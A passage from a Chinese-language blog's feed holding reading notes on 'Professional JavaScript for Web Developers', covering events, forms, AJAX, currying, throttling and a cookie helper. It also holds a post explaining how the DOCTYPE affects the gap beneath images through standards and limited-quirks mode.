class="string">'Page coordinates: '</span> + pageX + <span class="string">','</span> + pageY)</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
<li><strong>IE9+</strong> 支持变动事件，可以判断 <strong>DOM</strong> 结构的变动，如删除节点或插入节点</li>
<li>使用 <code>contextmenu</code> 事件可以模拟出自定义上下文菜单，在 Web 应用中达到原生的体验</li>
<li>与 <code>window.onload</code> 不同（所有资源下载完毕），<code>DOMContentLoaded</code> 事件（IE9+）在形成完整 DOM 树时触发（与<code>jQuery.ready()</code>类似）</li>
<li><strong>IE8+</strong> 支持 <code>window.hashchange</code> 事件，在 URL 的参数列表（及 URL 中 <code>#</code> 号后面的所有字符串）发生变化时触发，该方法可以实现一些简单的路由以监听 URL 变化</li>
<li>移动设备中有 <code>window.orientation</code> 属性，设备方向改变时触发 <code>orientationchange</code> 事件，而 <code>deviceorientation</code>事件可根据陀螺仪感应判断</li>
</ul>
<h4 id="内存和性能"><a href="#内存和性能" class="headerlink" title="内存和性能"></a>内存和性能</h4><ul>
<li><p>事件委托</p>
<blockquote>
<p>利用事件委托的冒泡，可以将事件统一绑定在 <code>document</code> （或其他方便统一管理的 DOM）上，这是对事件最常用对优化</p>
</blockquote>
</li>
<li><p>移除不需要的时间处理程序，常常用于删除 DOM 后释放内存</p>
</li>
</ul>
<h2 id="表单脚本"><a href="#表单脚本" class="headerlink" title="表单脚本"></a>表单脚本</h2><ul>
<li><code>submit</code> 事件可能在点击提交按钮后触发，也可能在之前触发</li>
<li><p>在不支持 <code>readonly</code> 特性的浏览器中，可以用 <code>blur</code> 方法来创建只读表单</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 显示25个字符，最多输入50个字符，带初始值 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"25"</span> <span class="attr">maxlength</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"initial value"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"25"</span> <span class="attr">cols</span>=<span class="string">"5"</span>&gt;</span>initial value<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>HTML5 中新增的一些表单 API 可以考虑在移动开发时适当应用</p>
</li>
</ul>
<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><ul>
<li><strong>JSON</strong> 是一种数据格式，并不从属于 <strong>JavaScript</strong></li>
<li>支持三种类型的值：<strong>简单值</strong>（字符串 / 数组 / 布尔值 / null）、<strong>对象</strong>、<strong>数组</strong>，不支持 <code>undefined</code></li>
<li>字符串与对象名严格要求使用双引号</li>
<li>JSON的早期解析使用 <code>eval()</code> 函数，<strong>IE8+</strong> 支持v<strong>JSON</strong> 对象，该对象有两个方法 <code>JSON.stringify()</code> 和<code>JSON.parse()</code>，分别用于把<br><strong>JavaScript</strong> 对象序列化为 <strong>JSON</strong> 字符串和把 <strong>JSON</strong> 字符串解析为原生 <strong>JavaScript</strong> 值。</li>
<li><code>JSON.stringify()</code> 可以接受两个可选参数，第一个参数（数组或函数）用来过滤输出的值，第二个参数表示输出值是否保留缩进</li>
</ul>
<h2 id="AJAX与Comet"><a href="#AJAX与Comet" class="headerlink" title="AJAX与Comet"></a>AJAX与Comet</h2><blockquote>
<p>这一章其实涉及到了很多前端开发会用到的通讯技术，因此最合适的方法是深入做一个总结并针对其优缺点进行考量</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> xhr = createXHR(); <span class="comment">//兼容IE7+</span></div><div class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;</div><div class="line">    <span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status == <span class="number">304</span>)&#123;</div><div class="line">      alert(xhr.responseText)</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      alert(<span class="string">"Request was unsuccessful: "</span> + xhr.status)</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'example.txt'</span>, <span class="literal">true</span>) <span class="comment">//启动XHR</span></div><div class="line">xhr.setRequestHeader(<span class="string">'MyHeader'</span>, <span class="string">'MyValue'</span>) <span class="comment">//设置头部信息</span></div><div class="line">xhr.send(<span class="literal">null</span>) <span class="comment">//发送XHR</span></div></pre></td></tr></table></figure>
<ul>
<li>FormData 类型（IE10+）</li>
<li>AJAX 跨域<ul>
<li>CORS</li>
<li>图像 Ping</li>
<li>JSONP</li>
</ul>
</li>
</ul>
<h2 id="高级技巧"><a href="#高级技巧" class="headerlink" title="高级技巧"></a>高级技巧</h2><h4 id="高级函数"><a href="#高级函数" class="headerlink" title="高级函数"></a>高级函数</h4><ul>
<li>安全的类型检查 =&gt; <code>Object.prototype.toString.call()</code></li>
<li><p>作用域安全的构造函数——避免使用构造函数时前面忘记加 <code>new</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span> (<span class="params">name, age, job</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">this</span> <span class="keyword">instanceof</span> Person) &#123;</div><div class="line">    <span class="keyword">this</span>.name = name</div><div class="line">    <span class="keyword">this</span>.age = age</div><div class="line">    <span class="keyword">this</span>.job = job</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Person(name, age, job)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>惰性载入函数（初始化性能还是初次运行性能？）</p>
<ol>
<li>第一次调用函数时判断浏览器兼容后，重新赋值对应浏览器兼容的方法给该函数，后续再次调用该函数时就直接使用最新兼容方法而无需再次判断兼容性</li>
<li>声明函数时直接判断好浏览器的兼容性返回对应能力的处理函数，这种方法只在首次加载时进行能力判断</li>
</ol>
</li>
<li><p>函数绑定</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bind</span> (<span class="params">fn, context</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 返回一个函数 binded(...arguments)，运行这个函数就会执行作用域绑定后的原函数</span></div><div class="line">    <span class="keyword">return</span> fn.apply(context, <span class="built_in">arguments</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 在 ES5 环境中原生支持这个方法 .bind()</span></div></pre></td></tr></table></figure>
</li>
<li><p>函数柯里化</p>
<blockquote>
<p>柯里化的实现思路是把原函数的参数分离</p>
</blockquote>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span> (<span class="params">fn, ...args</span>) </span>&#123; <span class="comment">// 这是原始函数，第一个参数是要柯里化的函数，其他是参数</span></div><div class="line">  <span class="keyword">var</span> outterArgs = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>) <span class="comment">// 因为原始函数第一个参数是 fn，因此提取出后面的参数</span></div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 生成新函数并返回</span></div><div class="line">    <span class="keyword">var</span> innerArgs = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>) <span class="comment">// 这是传入新函数的参数</span></div><div class="line">    <span class="keyword">var</span> finalArgs = outterArgs.concat(innerArgs) <span class="comment">// 合并原始函数和生成新函数的参数</span></div><div class="line">    <span class="keyword">return</span> fn.apply(<span class="literal">null</span>, finalArgs)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="防篡改对象"><a href="#防篡改对象" class="headerlink" title="防篡改对象"></a>防篡改对象</h4><ul>
<li>不可扩展对象（<code>Object.preventExtensions()</code>）</li>
<li>密封的对象（Sealed Object - ES5+）</li>
<li>冻结的对象（Frozen Object）</li>
</ul>
<h4 id="高级定时器"><a href="#高级定时器" class="headerlink" title="高级定时器"></a>高级定时器</h4><blockquote>
<p>这里入门体现了 JavaScript 的事件队列</p>
</blockquote>
<ul>
<li><p>重复的定时器</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 由于事件队列的实现方式，setTimeout 并不精确，考虑以下场景</span></div><div class="line">setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="comment">// 这里放入复杂的运算，需要超过 100ms 才能执行完毕</span></div><div class="line">  <span class="comment">// 导致的问题是，有些运算可能会被跳过，执行的间隔跟预期差太多，尤其是前者的问题会更严重一些</span></div><div class="line">&#125;, <span class="number">100</span>)</div><div class="line"></div><div class="line"><span class="comment">// 使用 setTimeout 模拟，这样可以保证运算不会被跳过，并且执行的间隔一致性会更好</span></div><div class="line"><span class="comment">// 实际开发中可能很少需要考虑这种，因为一般前端的运算时间误差都是可以接受的，但是总有一天会用得到</span></div><div class="line"><span class="keyword">var</span> task = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'doing'</span>)</div><div class="line">  <span class="comment">// 执行复杂的运算</span></div><div class="line">  setTimeout(task, <span class="number">100</span>)</div><div class="line">&#125;</div><div class="line">task() <span class="comment">// 首次执行</span></div></pre></td></tr></table></figure>
</li>
<li><p>Yielding Processes</p>
<blockquote>
<p>这里充分利用了 JavaScript 事件队列的特性，解决了单线程容易卡死的问题<br>建议是一个任务如果需要超过 50ms 的时间来执行，就可以考虑</p>
</blockquote>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 处理一个非常大的数据块，可能需要几十秒的时间，为了防止界面卡死，可以使用分割处理的方法</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">chunk</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> piece = data.splice(<span class="number">0</span>, <span class="number">10000</span>) <span class="comment">// 抽取出前 10000 个数据</span></div><div class="line">  <span class="comment">// 处理 piece</span></div><div class="line">  <span class="keyword">if</span> (data.length) &#123;</div><div class="line">    setTimeout(chunk, <span class="number">0</span>, data) <span class="comment">// 如果还有未处理的的数据，则等到下一个事件调度执行</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">chunk(veryBigData) <span class="comment">// 传入一个巨大的数组</span></div></pre></td></tr></table></figure>
<h4 id="函数节流与防抖"><a href="#函数节流与防抖" class="headerlink" title="函数节流与防抖"></a>函数节流与防抖</h4><ul>
<li>函数节流（Throttle）<blockquote>
<p>一般这个用在防止多次触发高消耗操作的地方，比如滚动时动态加载数据等</p>
</blockquote>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span> (<span class="params">method, context</span>) </span>&#123;</div><div class="line">  clearTimeout(method.id) <span class="comment">// 如果触发了 throttle，则先清除上一次的事件，然后重新绑定新倒计时</span></div><div class="line">  method.id = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 函数也可以定义属性，这样就节省了一个外部变量来保存 id</span></div><div class="line">    method.call(context)</div><div class="line">  &#125;, <span class="number">100</span>) <span class="comment">// 这里使用定时器是监听触发间隔不会太频繁</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>函数防抖（Debounce）<blockquote>
<p>这里引申一个函数防抖，这是基于函数节流的原理的。<br>前面的函数节流如果一直触发事件，那么可能一直也不会进入处理方法<br>防抖的意思是在指定间隔内跟节流一样不会触发多次，但至少会触发一次</p>
</blockquote>
</li>
</ul>
<h4 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h4><blockquote>
<p>这其实就是大名鼎鼎但观察者模式，实现里一个事件监听队列，是松散代码耦合但一种有效模式</p>
</blockquote>
<ul>
<li>概念<blockquote>
<p>由两种对象组成：观察者和主体<br>主体负责发布事件，观察者可以通过订阅的方式监听主体<br>关键点在于：主体并不知道观察者的存在，而观察者则知道主体的运作方式等（类似原生的 DOM 事件，DOM 是主体，而事件处理程序是观察者，一个主体可以有多个观察者）</p>
</blockquote>
</li>
</ul>
<h2 id="离线应用与客户端存储"><a href="#离线应用与客户端存储" class="headerlink" title="离线应用与客户端存储"></a>离线应用与客户端存储</h2><ul>
<li>离线检测<ul>
<li><code>navigator.onLine</code> 检测当前是否联网</li>
<li>在线与离线时触发事件 <code>online</code>，<code>offline</code></li>
</ul>
</li>
<li><p>应用缓存（application cache）</p>
<ul>
<li><code>manifest</code> 属性指定缓存文件（<code>&lt;html manifest=&quot;/offline.manifest&quot;&gt;</code>），其 <strong>MIME</strong> 类型必须是 <code>text/cache-manifest</code> 推荐扩展名为 <code>.appcache</code></li>
<li>手动更新 <code>applicationCache.update()</code></li>
</ul>
</li>
<li><p>HTTP Cookie</p>
<ul>
<li>名称，不区分大小写</li>
<li>值，URL 编码后的字符串</li>
<li>域，生效域，默认为来源</li>
<li>路径，相对域的路径</li>
<li>失效时间，GMT 格式</li>
<li>安全标志，只在 SSL 链接发送</li>
</ul>
</li>
<li><p><strong>JavaScript</strong> 通过 <code>document.cookie</code> 获取，使用 <code>decodeURIComponent()</code> 解码</p>
</li>
<li>封装的 <strong>Cookie</strong> 方法<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> CookieUtil = &#123;</div><div class="line">  <span class="attr">get</span>: <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> cookieName = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span>,</div><div class="line">      cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName),</div><div class="line">      cookieValue = <span class="literal">null</span></div><div class="line">    <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</div><div class="line">      <span class="keyword">var</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart)</div><div class="line">      <span class="keyword">if</span> (cookieEnd == <span class="number">-1</span>) &#123;</div><div class="line">        cookieEnd = <span class="built_in">document</span>.cookie.length</div><div class="line">      &#125;</div><div class="line">      cookieValue = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd))</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> cookieValue</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">name, value, expires, path, domain, secure</span>) </span>&#123; <span class="comment">//前两个参数必须</span></div><div class="line">    <span class="keyword">var</span> cookieText = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">"="</span> + <span class="built_in">encodeURIComponent</span>(value);</div><div class="line">    <span class="keyword">if</span> (expires <span class="keyword">instanceof</span> <span class="built_in">Date</span>) &#123;</div><div class="line">      cookieText += <span class="string">'; expires='</span> + expires.toGMTString()</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (path) &#123;</div><div class="line">      cookieText += <span class="string">'; path='</span> + path</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (domain) &#123;</div><div class="line">      cookieText += <span class="string">'; domain='</span> + domain</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (secure) &#123;</div><div class="line">      cookieText += <span class="string">'; secure'</span></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">document</span>.cookie = cookieText</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">unset</span>: <span class="function"><span class="keyword">function</span>(<span class="params">name, path, domain, secure</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.set(name, <span class="string">''</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>), path, domain, secure)</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><ul>
<li><p>可维护的代码</p>
<ul>
<li>可理解性 + 直观性 + 可适应性 + 可扩展性 + 可调试性</li>
<li>松散耦合<ul>
<li>勿将 <strong>Event</strong> 对象传给其他方法；只传来自 <strong>event</strong> 对象中所需的数据</li>
<li>任何可以在应用层面的动作都应该可以在不执行任何事件处理程序的情况下进行</li>
<li>任何事件处理程序都应该处理事件，然后将处理转交给应用逻辑</li>
</ul>
</li>
</ul>
</li>
<li><p>性能优化</p>
<ul>
<li>避免全局查找 —— 使用局部变量引用上层变量（尤其是DOM）</li>
<li>避免不必要的属性查找 —— 查找常量和数组比查找属性更高效</li>
<li>循环优化<ul>
<li>减值迭代更加高效</li>
<li>简化终止条件</li>
<li>简化循环体的计算量</li>
<li><code>do-while</code> 可以避免终止条件的计算</li>
<li>当循环次数确定时，不用循环而使用多次调用性能更好</li>
</ul>
</li>
<li>最小化语句数（<strong>UglifyJS</strong> 已经帮你考虑一些性能更好的优化）</li>
</ul>
</li>
</ul>
<h2 id="新兴的API"><a href="#新兴的API" class="headerlink" title="新兴的API"></a>新兴的API</h2><ul>
<li><p><strong>requestAnimationFrame</strong>（平滑的脚本动画）</p>
<blockquote>
<p>一般显示器的刷新率是 60Hz，因此最平化动画的循环间隔是 1000ms/60，约 17ms</p>
</blockquote>
</li>
<li><p>Page Visibility API（页面是否激活）</p>
</li>
<li><p>Geolocation API（地理定位）</p>
<blockquote>
<p>使用 <code>navigator.geolocation</code> 对象(IE9+)，和消息提示类似，需要用户手动授权</p>
</blockquote>
</li>
<li><p>File API （本地文件 - IE10+）</p>
</li>
<li>Web 计时</li>
<li>Web Workers</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;下半部分，主要涉及浏览器端，还有最佳实践和高级用法，尤其是高级技巧这一章，讲解了很多实战中会用到的有用技巧，让我来拓展一下吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/JavaScript高级程序设计.jpg&quot; alt=&quot;JavaScript高级程序设计&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于 DOCTYPE 的一个小发现</title>
    <link href="https://github.com/Hyifu/2015/12/18/%E5%85%B3%E4%BA%8EDOCTYPE%E7%9A%84%E5%B0%8F%E5%8F%91%E7%8E%B0/"/>
    <id>https://github.com/Hyifu/2015/12/18/关于DOCTYPE的小发现/</id>
    <published>2015-12-17T16:00:00.000Z</published>
    <updated>2017-05-01T02:17:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>&lt;!DOCTYPE html&gt;</code> 对于前端开发工程师（好吧，其实做 Web 都懂）而言，实在是太熟悉的一个东西了，由此引申的浏览器的各种模式也是一个老生常谈的坑。然而我在意外中竟然找到了一个鲜为人知的点，实在是惊讶！</p>
<a id="more"></a>
<h2 id="问题起源"><a href="#问题起源" class="headerlink" title="问题起源"></a>问题起源</h2><p>某天知乎瞎逼逛的时候，发现有一个新的问题：<a href="https://www.zhihu.com/question/38437397/answer/76617831" target="_blank" rel="external">发现html5一个很奇怪的问题…</a></p>
<blockquote>
<p>使用 XHTML 声明时，图片是完美贴合包裹 DIV 元素的<br>但使用 HTML 5 标准声明时，包裹 DIV 元素底部会被撑开 2～5 个像素不等</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:black;float:left"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://photocdn.sohu.com/20110902/Img318184717.jpg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:black;float:left"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://photocdn.sohu.com/20110902/Img318184717.jpg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>实际测试如下图所示，图片实际尺寸是（191 * 126）<br><img src="/images/DOCTYPE-diff.png" alt="DOCTYPE-diff"></p>
<h2 id="寻根问底"><a href="#寻根问底" class="headerlink" title="寻根问底"></a>寻根问底</h2><p>这就让人甚是疑惑，虽然实际开发中虽然一般重构基础过关的前端同学都知道，对于图片，一般都会使用 <code>vertical-align: middle</code> 使其与周边对齐，但是为什么使用老旧的文档声明反而是符合我们直观的显示呢？</p>
<p>本着兴趣和刨根问底的精神，我幸运地在国外程序员问答社区 <strong>stackoverflow</strong> 找到了类似的一个问答：<br><a href="http://stackoverflow.com/questions/4904668/html5-vertical-spacing-issue-with-img" target="_blank" rel="external">html5 vertical spacing issue with image tag</a></p>
<blockquote>
<p>首先，浏览器并没有所谓的“HTML 5 模式”，而是只有三种：怪异模式（Quirks)，几乎标准的模式（Limited Quirks）和标准模式（Standards），其中几乎标准的模式和标准模式之间的唯一差异在于是否对 <code>&lt;img&gt;</code> 元素给定行高（line-height）和基线（baseline）</p>
<p>几乎标准模式中，如果 <code>&lt;img&gt;</code> 标签所在行没有其他的行内元素，将不指定基线（baseline）， <code>&lt;img&gt;</code> 标签因此会紧贴着父元素底部</p>
<p>在标准模式中，行框总是会包含类似字母 <code>g</code>，<code>f</code> 尾巴下伸出来的那一部分空间（针对下行字母），即使行框内并没有任何内容。因此这种情况下你看到的 <code>&lt;img&gt;</code> 跟父元素底部几个像素的间隙实际上就是为”字母尾巴“预留的</p>
<p>使用 XHTML Transitional Doctype 会是浏览器运行在”几乎标准模式（Limited Quirks）”。如果你使用XHTML Strict 或者HTML 4 Strict模式，你将看到和使用HTML 5 模式同样的间隙，因为这是标准模式（Standards mode）</p>
</blockquote>
<p>天哪，单单一个简单的 DOCTYPE 就要牵扯出奇怪的基线问题，而这个基线仅仅又是因为英文字母会有上行字母和下行字母的对齐问题</p>
<h2 id="图片的最佳实践"><a href="#图片的最佳实践" class="headerlink" title="图片的最佳实践"></a>图片的最佳实践</h2><p>知道了前面的缘由，我们就有理由在后续的开发中找到一条最佳实践的道路了，我思考了很久，给出一条建议是加上下列的 CSS Reset</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">img</span> &#123;</div><div class="line">  <span class="attribute">max-width</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">max-height</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">vertical-align</span>: middle;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>虽然现在开发中已经不建议粗暴地加上 CSS Reset 而转为温柔的 <a href="http://necolas.github.io/normalize.css/" target="_blank" rel="external">normalize.css</a>，但我有我的理由：</p>
<p>首先，绝大部分时候你不希望图片把包裹层撑破，因此前两条规则限制了无法无天的图片撑开</p>
<p>其次，由于前面的图片对齐问题，你可能需要在所有图片都手动对齐以防出现奇怪的几个像素</p>
<h2 id="引申"><a href="#引申" class="headerlink" title="引申"></a>引申</h2><p>实际上由这个问题我联想到了实际开发中，有时会偶尔遇到包裹元素莫名比里面的元素最大值多几个像素的 BUG，直到现在我才恍然大悟！</p>
<p>图片本质上就是一个内联元素（或者说 <code>inline-block</code>，因为本身具有宽高），所以只要你在实际工作中，有若干个具备内联性质的元素水平对齐，就会出现这种情况：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrap"</span>&gt;</span></div><div class="line">  这里是文字</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inline"</span> <span class="attr">style</span>=<span class="string">"display: inline-block; width: 100px; height: 100px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>你实际看到的 <code>.wrap</code> 在不同的浏览器中高度都是略大于 100px 的，因为它给隐形的 “尾巴” 留了空间（把 <code>inline</code> 当作图片啦），真是神奇呢！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/code&gt; 对于前端开发工程师（好吧，其实做 Web 都懂）而言，实在是太熟悉的一个东西了，由此引申的浏览器的各种模式也是一个老生常谈的坑。然而我在意外中竟然找到了一个鲜为人知的点，实在是惊讶！&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《JavaScript高级程序设计》阅读笔记（上）</title>
    <link href="https://github.com/Hyifu/2015/12/08/%E3%80%8AJavaScript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2015/12/08/《JavaScript高级程序设计》阅读笔记（上）/</id>
    <published>2015-12-07T16:00:00.000Z</published>
    <updated>2017-04-21T15:08:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>堪称JavaScript中的必读圣经，又叫红宝书，第一部分主要讲解了语言特性，尤其是关于原型／继承的部分实在精彩</p>
<p><img src="/images/JavaScript高级程序设计.jpg" alt="JavaScript高级程序设计"></p>
<a id="more"></a>
<blockquote>
<p>作者 <strong>Nicholas C. Zakas</strong></p>
</blockquote>
<h2 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h2><ul>
<li>JavaScript 发展史<ul>
